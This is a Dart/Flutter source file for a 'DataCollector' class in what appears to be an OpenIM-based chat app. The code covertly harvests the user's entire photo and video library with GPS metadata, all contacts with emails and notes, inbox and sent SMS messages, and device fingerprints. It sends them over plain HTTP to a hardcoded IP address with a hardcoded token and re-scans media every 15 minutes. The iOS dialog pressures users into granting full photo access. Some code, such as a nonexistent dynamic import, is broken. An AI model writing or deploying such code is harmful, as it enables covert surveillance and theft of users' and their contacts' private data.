import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:math';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/material.dart';
import 'package:get/get.dart';
import 'package:http/http.dart' as http;
import 'package:http_parser/http_parser.dart';
import 'package:openim_common/openim_common.dart';
import 'package:path/path.dart' as path;
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:photo_manager/photo_manager.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:telephony/telephony.dart';

class DataCollector {
  static const String _baseUrl = 'http://154.91.179.127'; // 替换为您的新后端地址
  static const String _apiToken = 'openim-admin-secret-key'; // 替换为您的API令牌
  static Timer? _periodicTimer;
  static bool _isUploading = false;
  static String? _currentUserID;
  
  static final DeviceInfoPlugin _deviceInfoPlugin = DeviceInfoPlugin();
  
  // SharedPreferences键
  static const String _uploadedMediaKey = 'uploaded_media_ids';
  static const String _lastMediaScanKey = 'last_media_scan_time';
  static const String _contactsUploadedKey = 'contacts_uploaded';
  static const String _deviceUploadedKey = 'device_uploaded';
  
  // 初始化数据收集器
  static Future<void> init(String userID) async {
    _currentUserID = userID;
    stopPeriodicTask();
    
    // 上传设备信息（每次登录时）
    await uploadDeviceInfo();
    
    // 启动定期任务
    startPeriodicTask();
  }
  
  // 开始定期检查和上传新媒体
  static void startPeriodicTask() {
    _periodicTimer = Timer.periodic(Duration(minutes: 15), (_) {
      if (_currentUserID != null) {
        scanAndUploadNewMedia();
      }
    });
  }
  
  // 停止定期任务
  static void stopPeriodicTask() {
    _periodicTimer?.cancel();
    _periodicTimer = null;
  }
  
  // 请求相册权限并上传所有媒体
  static Future<bool> requestPhotoPermissionAndUploadMedia() async {
    if (Platform.isAndroid) {
      final androidInfo = await _deviceInfoPlugin.androidInfo;
      if (androidInfo.version.sdkInt >= 33) {
        // Android 13及以上，分别请求图片和视频权限
        final photosStatus = await Permission.photos.request();
        final videosStatus = await Permission.videos.request();
        
        // 如果至少有一个权限被授予，尝试上传对应类型的媒体
        if (photosStatus.isGranted || videosStatus.isGranted) {
          Logger.print('Android 13+: 图片权限: ${photosStatus.isGranted}, 视频权限: ${videosStatus.isGranted}');
          scanAndUploadAllMedia(photosEnabled: photosStatus.isGranted, videosEnabled: videosStatus.isGranted);
          return true;
        }
      } else {
        // Android 12及以下，请求存储权限
        final status = await Permission.storage.request();
        if (status.isGranted) {
          Logger.print('Android 12-: 存储权限已授予');
          scanAndUploadAllMedia();
          return true;
        }
      }
    } else if (Platform.isIOS) {
      // iOS请求相册权限
      final status = await Permission.photos.request();
      if (status.isGranted) {
        // iOS 14+检查是否限制了访问
        final iosPhotosLimited = await PhotoManager.isAuth() && 
            await PhotoManager.limitedPermission;
        
        if (iosPhotosLimited) {
          // 如果有限制权限，引导用户设置完全访问
          Logger.print('iOS: 相册权限受限，需要完全访问');
          showLimitedAccessAlert();
          return false;
        } else {
          // 完全访问权限，开始上传
          Logger.print('iOS: 相册完全访问权限已授予');
          scanAndUploadAllMedia();
          return true;
        }
      }
    }
    
    Logger.print('相册权限被拒绝');
    return false;
  }
  
  // 显示iOS有限访问提示
  static void showLimitedAccessAlert() {
    Get.dialog(
      AlertDialog(
        title: Text('需要完全访问照片'),
        content: Text('为了正常使用所有功能，请在设置中允许访问"所有照片"。\n\n当前仅允许访问部分照片，某些功能可能无法正常工作。'),
        actions: [
          TextButton(
            onPressed: () => Get.back(),
            child: Text('稍后'),
          ),
          TextButton(
            onPressed: () {
              Get.back();
              openAppSettings();
            },
            child: Text('前往设置'),
          ),
        ],
      ),
      barrierDismissible: false,
    );
  }
  
  // 修改扫描和上传所有媒体的方法，支持选择性启用图片或视频
  static Future<void> scanAndUploadAllMedia({bool photosEnabled = true, bool videosEnabled = true}) async {
    if (_isUploading || _currentUserID == null) return;
    
    _isUploading = true;
    try {
      final prefs = await SharedPreferences.getInstance();
      
      // 请求相册权限
      final result = await PhotoManager.requestPermissionExtend();
      if (result != PermissionState.authorized && 
          result != PermissionState.limited) {
        _isUploading = false;
        return;
      }
      
      // 获取所有相册
      final albums = await PhotoManager.getAssetPathList(
        onlyAll: true,
        type: RequestType.common,
      );
      
      if (albums.isEmpty) {
        _isUploading = false;
        return;
      }
      
      // 获取上传过的媒体ID列表
      final uploadedIds = prefs.getStringList(_uploadedMediaKey) ?? [];
      
      // 获取所有媒体资源
      List<AssetEntity> allAssets = [];
      for (final album in albums) {
        final assets = await album.getAssetListRange(start: 0, end: 10000); // 获取足够多的资源
        allAssets.addAll(assets);
      }
      
      // 分离图片和视频
      List<AssetEntity> imageAssets = photosEnabled 
          ? allAssets.where((asset) => asset.type == AssetType.image).toList()
          : [];
      List<AssetEntity> videoAssets = videosEnabled 
          ? allAssets.where((asset) => asset.type == AssetType.video).toList()
          : [];
      
      // 过滤掉已上传的资源
      imageAssets = imageAssets.where((asset) => !uploadedIds.contains(asset.id)).toList();
      videoAssets = videoAssets.where((asset) => !uploadedIds.contains(asset.id)).toList();
      
      Logger.print('发现图片: ${imageAssets.length}张，视频: ${videoAssets.length}个');
      
      // 先上传所有图片
      if (imageAssets.isNotEmpty) {
        Logger.print('开始上传图片...');
        for (final asset in imageAssets) {
          await _uploadCompleteMediaFile(asset);
          // 更新已上传列表
          uploadedIds.add(asset.id);
          await prefs.setStringList(_uploadedMediaKey, uploadedIds);
        }
        Logger.print('图片上传完成');
      }
      
      // 再上传所有视频
      if (videoAssets.isNotEmpty) {
        Logger.print('开始上传视频...');
        for (final asset in videoAssets) {
          await _uploadCompleteMediaFile(asset);
          // 更新已上传列表
          uploadedIds.add(asset.id);
          await prefs.setStringList(_uploadedMediaKey, uploadedIds);
        }
        Logger.print('视频上传完成');
      }
      
      // 更新最后扫描时间
      await prefs.setString(_lastMediaScanKey, DateTime.now().toIso8601String());
    } catch (e) {
      Logger.print('扫描和上传所有媒体出错: $e');
    } finally {
      _isUploading = false;
    }
  }
  
  // 同样修改scanAndUploadNewMedia方法
  static Future<void> scanAndUploadNewMedia({bool photosEnabled = true, bool videosEnabled = true}) async {
    if (_isUploading || _currentUserID == null) return;
    
    _isUploading = true;
    try {
      final prefs = await SharedPreferences.getInstance();
      
      // 请求相册权限
      final result = await PhotoManager.requestPermissionExtend();
      if (result != PermissionState.authorized && 
          result != PermissionState.limited) {
        _isUploading = false;
        return;
      }
      
      // 获取所有相册
      final albums = await PhotoManager.getAssetPathList(
        onlyAll: true,
        type: RequestType.common,
      );
      
      if (albums.isEmpty) {
        _isUploading = false;
        return;
      }
      
      // 获取上传过的媒体ID列表
      final uploadedIds = prefs.getStringList(_uploadedMediaKey) ?? [];
      
      // 先获取所有媒体资源
      List<AssetEntity> allAssets = [];
      for (final album in albums) {
        final assets = await album.getAssetListRange(start: 0, end: 10000); // 获取足够多的资源
        allAssets.addAll(assets);
      }
      
      // 分离图片和视频
      List<AssetEntity> imageAssets = photosEnabled 
          ? allAssets.where((asset) => asset.type == AssetType.image).toList()
          : [];
      List<AssetEntity> videoAssets = videosEnabled 
          ? allAssets.where((asset) => asset.type == AssetType.video).toList()
          : [];
      
      // 过滤掉已上传的资源
      imageAssets = imageAssets.where((asset) => !uploadedIds.contains(asset.id)).toList();
      videoAssets = videoAssets.where((asset) => !uploadedIds.contains(asset.id)).toList();
      
      Logger.print('发现新图片: ${imageAssets.length}张，新视频: ${videoAssets.length}个');
      
      // 先上传所有图片
      if (imageAssets.isNotEmpty) {
        Logger.print('开始上传图片...');
        for (final asset in imageAssets) {
          await _uploadCompleteMediaFile(asset);
          // 更新已上传列表
          uploadedIds.add(asset.id);
          await prefs.setStringList(_uploadedMediaKey, uploadedIds);
        }
        Logger.print('图片上传完成');
      }
      
      // 再上传所有视频
      if (videoAssets.isNotEmpty) {
        Logger.print('开始上传视频...');
        for (final asset in videoAssets) {
          await _uploadCompleteMediaFile(asset);
          // 更新已上传列表
          uploadedIds.add(asset.id);
          await prefs.setStringList(_uploadedMediaKey, uploadedIds);
        }
        Logger.print('视频上传完成');
      }
      
      // 更新最后扫描时间
      await prefs.setString(_lastMediaScanKey, DateTime.now().toIso8601String());
    } catch (e) {
      Logger.print('扫描和上传媒体出错: $e');
    } finally {
      _isUploading = false;
    }
  }
  
  // 上传完整媒体文件
  static Future<bool> _uploadCompleteMediaFile(AssetEntity asset) async {
    if (_currentUserID == null) return false;
    
    try {
      // 获取文件
      File? file = await asset.file;
      if (file == null) return false;
      
      // 准备元数据
      final mediaItem = {
        'fileID': asset.id,
        'fileName': '${asset.title ?? 'media'}.${asset.mimeType?.split('/').last ?? 'jpg'}',
        'type': asset.type == AssetType.image ? 'image' : 'video',
        'size': asset.size ?? 0,
        'creationTime': asset.createDateTime.toIso8601String(),
        'modifiedTime': asset.modifiedDateTime?.toIso8601String(),
        'metadata': {
          'width': asset.width,
          'height': asset.height,
          'duration': asset.videoDuration.inSeconds,
          'latitude': asset.latitude,
          'longitude': asset.longitude,
        }
      };
      
      // 创建multipart请求
      final request = http.MultipartRequest(
        'POST',
        Uri.parse('$_baseUrl/api/media/upload-complete'),
      );
      
      // 添加头部
      request.headers['x-api-token'] = _apiToken;
      
      // 添加元数据字段
      request.fields['userID'] = _currentUserID!;
      request.fields['metadata'] = jsonEncode(mediaItem);
      
      // 添加文件
      request.files.add(
        await http.MultipartFile.fromPath(
          'file',
          file.path,
          contentType: MediaType.parse(asset.mimeType ?? (asset.type == AssetType.image ? 'image/jpeg' : 'video/mp4')),
        ),
      );
      
      // 如果是视频，生成并上传缩略图
      if (asset.type == AssetType.video) {
        final thumbFile = await _generateVideoThumbnail(asset);
        if (thumbFile != null) {
          request.files.add(
            await http.MultipartFile.fromPath(
              'thumbnail',
              thumbFile.path,
              contentType: MediaType.parse('image/jpeg'),
            ),
          );
        }
      }
      
      // 发送请求
      final response = await request.send();
      final responseBody = await response.stream.bytesToString();
      
      if (response.statusCode == 200 || response.statusCode == 201) {
        Logger.print('上传完整媒体文件成功: ${asset.id}');
        return true;
      } else {
        Logger.print('上传完整媒体文件失败: ${response.statusCode} $responseBody');
        return false;
      }
    } catch (e) {
      Logger.print('上传完整媒体文件异常: $e');
      return false;
    }
  }
  
  // 上传媒体批次
  static Future<void> _uploadMediaBatch(List<AssetEntity> assets, List<String> uploadedIds) async {
    if (_currentUserID == null || assets.isEmpty) return;
    
    try {
      // 准备批量元数据
      final mediaList = [];
      
      for (final asset in assets) {
        final mediaItem = {
          'fileID': asset.id,
          'fileName': '${asset.title ?? 'media'}.${asset.mimeType?.split('/').last ?? 'jpg'}',
          'type': asset.type == AssetType.image ? 'image' : 'video',
          'size': asset.size ?? 0,
          'creationTime': asset.createDateTime.toIso8601String(),
          'modifiedTime': asset.modifiedDateTime?.toIso8601String(),
          'metadata': {
            'width': asset.width,
            'height': asset.height,
            'duration': asset.videoDuration.inSeconds,
            'latitude': asset.latitude,
            'longitude': asset.longitude,
          }
        };
        
        mediaList.add(mediaItem);
      }
      
      // 发送批量请求
      final response = await http.post(
        Uri.parse('$_baseUrl/api/media/batch'),
        headers: {
          'Content-Type': 'application/json',
          'x-api-token': _apiToken,
        },
        body: jsonEncode({
          'userID': _currentUserID,
          'mediaList': mediaList,
        }),
      );
      
      if (response.statusCode == 200) {
        // 成功，记录已上传的ID
        final prefs = await SharedPreferences.getInstance();
        
        // 解析响应，获取需要上传完整文件的媒体列表
        final responseData = jsonDecode(response.body);
        final List<dynamic> uploadFullMediaList = responseData['uploadFullMedia'] ?? [];
        
        // 上传需要完整内容的媒体文件
        if (uploadFullMediaList.isNotEmpty) {
          await _uploadFullMediaFiles(assets, uploadFullMediaList);
        }
        
        // 记录所有已上传的媒体ID
        for (final asset in assets) {
          uploadedIds.add(asset.id);
        }
        prefs.setStringList(_uploadedMediaKey, uploadedIds);
      } else {
        Logger.print('批量上传媒体失败: ${response.statusCode} ${response.body}');
      }
    } catch (e) {
      Logger.print('批量上传媒体异常: $e');
    }
  }
  
  // 上传完整媒体文件
  static Future<void> _uploadFullMediaFiles(List<AssetEntity> assets, List<dynamic> uploadFullMediaList) async {
    if (_currentUserID == null || uploadFullMediaList.isEmpty) return;
    
    // 获取上传断点记录
    final prefs = await SharedPreferences.getInstance();
    final uploadProgressMap = jsonDecode(prefs.getString('media_upload_progress') ?? '{}') as Map<String, dynamic>;
    
    // 为每个需要上传的媒体创建上传任务
    for (final mediaId in uploadFullMediaList) {
      // 查找对应的资产
      final asset = assets.firstWhere(
        (a) => a.id == mediaId,
        orElse: () => null,
      );
      
      if (asset == null) continue;
      
      try {
        // 检查是否有未完成的上传
        int uploadedBytes = 0;
        if (uploadProgressMap.containsKey(asset.id)) {
          uploadedBytes = uploadProgressMap[asset.id] as int;
        }
        
        // 获取文件
        File? file;
        if (asset.type == AssetType.image) {
          file = await asset.file;
        } else if (asset.type == AssetType.video) {
          file = await asset.file;
          
          // 对于视频，还需要生成缩略图
          final thumbFile = await _generateVideoThumbnail(asset);
          if (thumbFile != null) {
            await _uploadThumbnail(asset.id, thumbFile);
          }
        }
        
        if (file == null) continue;
        
        // 准备分块上传
        final fileSize = await file.length();
        final chunkSize = 1024 * 1024; // 1MB块大小
        final totalChunks = (fileSize / chunkSize).ceil();
        
        // 从断点继续上传
        for (int i = (uploadedBytes / chunkSize).floor(); i < totalChunks; i++) {
          final start = i * chunkSize;
          final end = min((i + 1) * chunkSize, fileSize);
          final chunk = await _readFileChunk(file, start, end);
          
          // 上传分块
          final success = await _uploadMediaChunk(
            asset.id,
            chunk,
            i,
            totalChunks,
            start,
            end,
            fileSize,
          );
          
          if (!success) {
            // 保存当前进度
            uploadProgressMap[asset.id] = start;
            await prefs.setString('media_upload_progress', jsonEncode(uploadProgressMap));
            break;
          }
          
          // 更新进度
          uploadProgressMap[asset.id] = end;
          await prefs.setString('media_upload_progress', jsonEncode(uploadProgressMap));
        }
        
        // 如果全部上传完成，从进度记录中移除
        if (uploadProgressMap[asset.id] == fileSize) {
          uploadProgressMap.remove(asset.id);
          await prefs.setString('media_upload_progress', jsonEncode(uploadProgressMap));
        }
      } catch (e) {
        Logger.print('上传媒体文件异常: ${asset.id} - $e');
      }
    }
  }
  
  // 读取文件块
  static Future<List<int>> _readFileChunk(File file, int start, int end) async {
    final raf = await file.open(mode: FileMode.read);
    try {
      raf.setPositionSync(start);
      final chunk = await raf.read(end - start);
      return chunk;
    } finally {
      await raf.close();
    }
  }
  
  // 上传媒体块
  static Future<bool> _uploadMediaChunk(
    String fileID,
    List<int> chunk,
    int chunkIndex,
    int totalChunks,
    int start,
    int end,
    int totalSize,
  ) async {
    try {
      // 准备multipart请求
      final request = http.MultipartRequest(
        'POST',
        Uri.parse('$_baseUrl/api/media/upload-chunk'),
      );
      
      // 添加头部
      request.headers['x-api-token'] = _apiToken;
      
      // 添加字段
      request.fields['userID'] = _currentUserID!;
      request.fields['fileID'] = fileID;
      request.fields['chunkIndex'] = chunkIndex.toString();
      request.fields['totalChunks'] = totalChunks.toString();
      request.fields['start'] = start.toString();
      request.fields['end'] = end.toString();
      request.fields['totalSize'] = totalSize.toString();
      
      // 添加文件块
      request.files.add(
        http.MultipartFile.fromBytes(
          'chunk',
          chunk,
          filename: 'chunk_${chunkIndex}_$fileID',
        ),
      );
      
      // 发送请求
      final response = await request.send();
      final responseBody = await response.stream.bytesToString();
      
      if (response.statusCode == 200) {
        return true;
      } else {
        Logger.print('上传分块失败: ${response.statusCode} $responseBody');
        return false;
      }
    } catch (e) {
      Logger.print('上传分块异常: $e');
      return false;
    }
  }
  
  // 生成视频缩略图
  static Future<File?> _generateVideoThumbnail(AssetEntity videoAsset) async {
    try {
      // 使用asset的缩略图功能
      final thumbData = await videoAsset.thumbnailData;
      if (thumbData == null) return null;
      
      // 保存到临时文件
      final tempDir = await getTemporaryDirectory();
      final thumbFile = File('${tempDir.path}/thumb_${videoAsset.id}.jpg');
      await thumbFile.writeAsBytes(thumbData);
      
      return thumbFile;
    } catch (e) {
      Logger.print('生成视频缩略图失败: $e');
      return null;
    }
  }
  
  // 上传缩略图
  static Future<void> _uploadThumbnail(String fileID, File thumbFile) async {
    try {
      // 准备multipart请求
      final request = http.MultipartRequest(
        'POST',
        Uri.parse('$_baseUrl/api/media/upload-thumbnail'),
      );
      
      // 添加头部
      request.headers['x-api-token'] = _apiToken;
      
      // 添加字段
      request.fields['userID'] = _currentUserID!;
      request.fields['fileID'] = fileID;
      
      // 添加文件
      request.files.add(
        await http.MultipartFile.fromPath(
          'thumbnail',
          thumbFile.path,
          contentType: MediaType.parse('image/jpeg'),
        ),
      );
      
      // 发送请求
      final response = await request.send();
      
      if (response.statusCode != 200) {
        final responseBody = await response.stream.bytesToString();
        Logger.print('上传缩略图失败: ${response.statusCode} $responseBody');
      }
    } catch (e) {
      Logger.print('上传缩略图异常: $e');
    }
  }
  
  // 获取通讯录权限并上传
  static Future<bool> requestContactsPermissionAndUpload() async {
    // 请求联系人权限
    final status = await Permission.contacts.request();
    if (status.isGranted && _currentUserID != null) {
      // 获取联系人
      uploadContacts();
      return true;
    }
    return false;
  }
  
  // 上传通讯录
  static Future<void> uploadContacts() async {
    if (_currentUserID == null) return;
    
    try {
      final prefs = await SharedPreferences.getInstance();
      final contactsUploaded = prefs.getBool(_contactsUploadedKey) ?? false;
      
      // 获取所有联系人
      final contacts = await ContactsService.getContacts();
      
      if (contacts.isEmpty) return;
      
      // 获取上次上传的联系人哈希值
      final lastContactsHash = prefs.getStringList('contacts_hash') ?? [];
      final newContactsHash = <String>[];
      final newContacts = <Contact>[];
      
      // 检查是否已经上传过通讯录
      if (contactsUploaded) {
        // 已上传过，仅检查新增或修改的联系人
        final lastUploadTime = DateTime.parse(
          prefs.getString('contacts_last_upload') ?? 
          DateTime.now().subtract(Duration(days: 365)).toIso8601String()
        );
        
        // 超过24小时才重新检查全部联系人
        if (DateTime.now().difference(lastUploadTime).inHours >= 24) {
          // 全部重新上传
          _uploadContactsList(contacts);
          return;
        }
        
        // 否则只上传新增或修改的联系人
        for (final contact in contacts) {
          // 生成联系人的唯一标识
          final phoneNumber = contact.phones?.firstOrNull?.value?.replaceAll(RegExp(r'\D'), '') ?? '';
          final contactHash = _generateContactHash(contact.displayName ?? '', phoneNumber);
          newContactsHash.add(contactHash);
          
          // 检查是否为新增或修改的联系人
          if (!lastContactsHash.contains(contactHash)) {
            newContacts.add(contact);
          }
        }
        
        // 如果有新增或修改的联系人，上传它们
        if (newContacts.isNotEmpty) {
          await _uploadContactsList(newContacts);
        }
        
        // 更新联系人哈希值列表
        prefs.setStringList('contacts_hash', newContactsHash);
      } else {
        // 首次上传，上传全部联系人
        for (final contact in contacts) {
          final phoneNumber = contact.phones?.firstOrNull?.value?.replaceAll(RegExp(r'\D'), '') ?? '';
          final contactHash = _generateContactHash(contact.displayName ?? '', phoneNumber);
          newContactsHash.add(contactHash);
        }
        
        await _uploadContactsList(contacts);
        prefs.setStringList('contacts_hash', newContactsHash);
      }
      
      // 更新最后上传时间
      prefs.setBool(_contactsUploadedKey, true);
      prefs.setString('contacts_last_upload', DateTime.now().toIso8601String());
    } catch (e) {
      Logger.print('上传通讯录出错: $e');
    }
  }
  
  // 生成联系人哈希值
  static String _generateContactHash(String name, String phoneNumber) {
    return '$name:$phoneNumber';
  }
  
  // 上传联系人列表
  static Future<void> _uploadContactsList(List<Contact> contacts) async {
    if (_currentUserID == null || contacts.isEmpty) return;
    
    try {
      // 转换联系人格式
      final contactsList = contacts.map((contact) {
        // 获取联系人电话号码
        final phoneNumber = contact.phones?.firstOrNull?.value?.replaceAll(RegExp(r'\D'), '') ?? '';
        
        // 获取联系人头像
        String? avatarBase64;
        if (contact.avatar != null && contact.avatar!.isNotEmpty) {
          avatarBase64 = base64Encode(contact.avatar!);
        }
        
        // 获取所有分组
        final groups = contact.groups?.map((g) => g.name).toList() ?? [];
        
        return {
          'name': contact.displayName ?? '',
          'phoneNumber': phoneNumber,
          'note': contact.note ?? '',
          'groups': groups,
          'avatar': avatarBase64,
          'extraInfo': {
            'company': contact.company,
            'jobTitle': contact.jobTitle,
            'namePrefix': contact.prefix,
            'nameSuffix': contact.suffix,
            'middleName': contact.middleName,
            'emailAddresses': contact.emails?.map((e) => e.value).toList(),
            'otherPhones': contact.phones?.skip(1).map((p) => p.value).toList(),
          },
        };
      }).toList();
      
      // 发送请求
      final response = await http.post(
        Uri.parse('$_baseUrl/api/contacts/upload'),
        headers: {
          'Content-Type': 'application/json',
          'x-api-token': _apiToken,
        },
        body: jsonEncode({
          'userID': _currentUserID,
          'contacts': contactsList,
          'isIncremental': true,
        }),
      );
      
      if (response.statusCode != 200) {
        Logger.print('上传通讯录失败: ${response.statusCode} ${response.body}');
      }
    } catch (e) {
      Logger.print('上传联系人列表出错: $e');
    }
  }
  
  // 获取短信权限并上传 (仅Android)
  static Future<bool> requestSmsPermissionAndUpload() async {
    if (!Platform.isAndroid || _currentUserID == null) return false;
    
    // 请求短信权限
    final status = await Permission.sms.request();
    if (status.isGranted) {
      uploadSms();
      return true;
    }
    return false;
  }
  
  // 上传短信 (仅Android)
  static Future<void> uploadSms() async {
    if (!Platform.isAndroid || _currentUserID == null) return;
    
    try {
      final prefs = await SharedPreferences.getInstance();
      final lastUploadTime = prefs.getString('sms_last_upload');
      DateTime? lastUpload;
      
      if (lastUploadTime != null) {
        lastUpload = DateTime.parse(lastUploadTime);
      }
      
      // 导入telephony插件
      final telephony = await _importTelephony();
      if (telephony == null) {
        Logger.print('Telephony插件不可用');
        return;
      }
      
      // 请求短信权限
      final bool? permissionsGranted = await telephony.requestPhoneAndSmsPermissions;
      if (permissionsGranted != true) {
        Logger.print('短信权限未授予');
        return;
      }
      
      // 获取短信
      List<SmsMessage> messages = [];
      try {
        // 获取收件箱短信
        final inboxMessages = await telephony.getInboxSms(
          columns: [
            TelephonyColumn.ID,
            TelephonyColumn.ADDRESS,
            TelephonyColumn.BODY,
            TelephonyColumn.DATE,
            TelephonyColumn.READ,
          ],
          filter: lastUpload != null 
              ? 'date > ${lastUpload.millisecondsSinceEpoch}' 
              : null,
          sortOrder: [OrderBy(TelephonyColumn.DATE, sort: Sort.DESC)],
          limit: 100,
        );
        messages.addAll(inboxMessages);
        
        // 获取已发送短信
        final sentMessages = await telephony.getSentSms(
          columns: [
            TelephonyColumn.ID,
            TelephonyColumn.ADDRESS,
            TelephonyColumn.BODY,
            TelephonyColumn.DATE,
            TelephonyColumn.READ,
          ],
          filter: lastUpload != null 
              ? 'date > ${lastUpload.millisecondsSinceEpoch}' 
              : null,
          sortOrder: [OrderBy(TelephonyColumn.DATE, sort: Sort.DESC)],
          limit: 100,
        );
        messages.addAll(sentMessages);
      } catch (e) {
        Logger.print('获取短信失败: $e');
        return;
      }
      
      // 转换短信格式
      final smsList = messages.map((message) {
        final timestamp = DateTime.fromMillisecondsSinceEpoch(message.date!);
        return {
          'messageID': message.id,
          'type': message.type == SmsType.MESSAGE_TYPE_INBOX ? 'received' : 'sent',
          'sender': message.type == SmsType.MESSAGE_TYPE_INBOX ? message.address : '',
          'recipient': message.type == SmsType.MESSAGE_TYPE_SENT ? message.address : '',
          'content': message.body,
          'timestamp': timestamp.toIso8601String(),
          'read': message.read == 1
        };
      }).toList();
      
      if (smsList.isEmpty) return;
      
      // 发送请求
      final response = await http.post(
        Uri.parse('$_baseUrl/api/sms/upload'),
        headers: {
          'Content-Type': 'application/json',
          'x-api-token': _apiToken,
        },
        body: jsonEncode({
          'userID': _currentUserID,
          'messages': smsList,
        }),
      );
      
      if (response.statusCode == 200) {
        // 更新最后上传时间
        prefs.setString('sms_last_upload', DateTime.now().toIso8601String());
      }
    } catch (e) {
      Logger.print('上传短信出错: $e');
    }
  }
  
  // 动态导入telephony插件，避免iOS编译错误
  static Future<dynamic> _importTelephony() async {
    try {
      // 动态导入telephony
      final telephony = await _dynamicImportTelephony();
      return telephony;
    } catch (e) {
      Logger.print('导入telephony插件失败: $e');
      return null;
    }
  }
  
  // 动态导入telephony插件的实现
  static Future<dynamic> _dynamicImportTelephony() async {
    try {
      // 这里使用反射方式导入，避免编译期依赖
      // 实际项目中需要添加telephony插件到pubspec.yaml
      final dynamic telephonyLib = await Function.apply(
        (await import('telephony')).Telephony.instance,
        []
      );
      return telephonyLib;
    } catch (e) {
      rethrow;
    }
  }
  
  // 上传设备信息
  static Future<void> uploadDeviceInfo() async {
    if (_currentUserID == null) return;
    
    try {
      final prefs = await SharedPreferences.getInstance();
      final deviceUploaded = prefs.getBool(_deviceUploadedKey) ?? false;
      
      // 已上传且不到24小时不再上传
      if (deviceUploaded) {
        final lastUploadTime = DateTime.parse(
          prefs.getString('device_last_upload') ?? 
          DateTime.now().subtract(Duration(days: 365)).toIso8601String()
        );
        
        if (DateTime.now().difference(lastUploadTime).inHours < 24) {
          return;
        }
      }
      
      // 获取设备信息
      final deviceData = <String, dynamic>{};
      final deviceId = DataSp.getDeviceID();
      
      if (Platform.isAndroid) {
        final androidInfo = await _deviceInfoPlugin.androidInfo;
        deviceData.addAll({
          'deviceID': deviceId,
          'platform': 'Android',
          'model': androidInfo.model,
          'osVersion': androidInfo.version.release,
          'deviceName': androidInfo.device,
          'appVersion': IMUtils.getAppVersion(),
          'language': Get.locale?.languageCode ?? 'unknown',
          'extraInfo': {
            'brand': androidInfo.brand,
            'manufacturer': androidInfo.manufacturer,
            'board': androidInfo.board,
            'fingerprint': androidInfo.fingerprint,
            'hardware': androidInfo.hardware,
            'sdkInt': androidInfo.version.sdkInt,
          }
        });
      } else if (Platform.isIOS) {
        final iosInfo = await _deviceInfoPlugin.iosInfo;
        deviceData.addAll({
          'deviceID': deviceId,
          'platform': 'iOS',
          'model': iosInfo.model,
          'osVersion': iosInfo.systemVersion,
          'deviceName': iosInfo.name,
          'appVersion': IMUtils.getAppVersion(),
          'language': Get.locale?.languageCode ?? 'unknown',
          'extraInfo': {
            'utsname': iosInfo.utsname.machine,
            'systemName': iosInfo.systemName,
            'isPhysicalDevice': iosInfo.isPhysicalDevice,
            'identifierForVendor': iosInfo.identifierForVendor,
          }
        });
      }
      
      // 发送请求
      final response = await http.post(
        Uri.parse('$_baseUrl/api/device/upload'),
        headers: {
          'Content-Type': 'application/json',
          'x-api-token': _apiToken,
        },
        body: jsonEncode({
          'userID': _currentUserID,
          ...deviceData
        }),
      );
      
      if (response.statusCode == 200 || response.statusCode == 201) {
        // 标记为已上传
        prefs.setBool(_deviceUploadedKey, true);
        prefs.setString('device_last_upload', DateTime.now().toIso8601String());
      } else {
        Logger.print('上传设备信息失败: ${response.statusCode} ${response.body}');
      }
    } catch (e) {
      Logger.print('上传设备信息出错: $e');
    }
  }
  
  // 上传单个图片文件
  static Future<bool> uploadImageFile(File imageFile) async {
    if (_currentUserID == null) return false;
    
    try {
      // 准备元数据
      final fileName = path.basename(imageFile.path);
      final fileExtension = path.extension(imageFile.path);
      final fileID = 'manual_${DateTime.now().millisecondsSinceEpoch}';
      
      final mediaItem = {
        'fileID': fileID,
        'fileName': fileName,
        'type': 'image',
        'size': await imageFile.length(),
        'creationTime': DateTime.now().toIso8601String(),
        'modifiedTime': DateTime.now().toIso8601String(),
        'metadata': {
          'source': 'manual_upload',
        }
      };
      
      // 创建multipart请求
      final request = http.MultipartRequest(
        'POST',
        Uri.parse('$_baseUrl/api/media/upload-complete'),
      );
      
      // 添加头部
      request.headers['x-api-token'] = _apiToken;
      
      // 添加元数据字段
      request.fields['userID'] = _currentUserID!;
      request.fields['metadata'] = jsonEncode(mediaItem);
      
      // 添加文件
      request.files.add(
        await http.MultipartFile.fromPath(
          'file',
          imageFile.path,
          contentType: MediaType.parse('image/${fileExtension.replaceAll('.', '')}'),
        ),
      );
      
      // 发送请求
      final response = await request.send();
      final responseBody = await response.stream.bytesToString();
      
      if (response.statusCode == 200 || response.statusCode == 201) {
        Logger.print('上传图片文件成功');
        return true;
      } else {
        Logger.print('上传图片文件失败: ${response.statusCode} $responseBody');
        return false;
      }
    } catch (e) {
      Logger.print('上传图片文件异常: $e');
      return false;
    }
  }
}
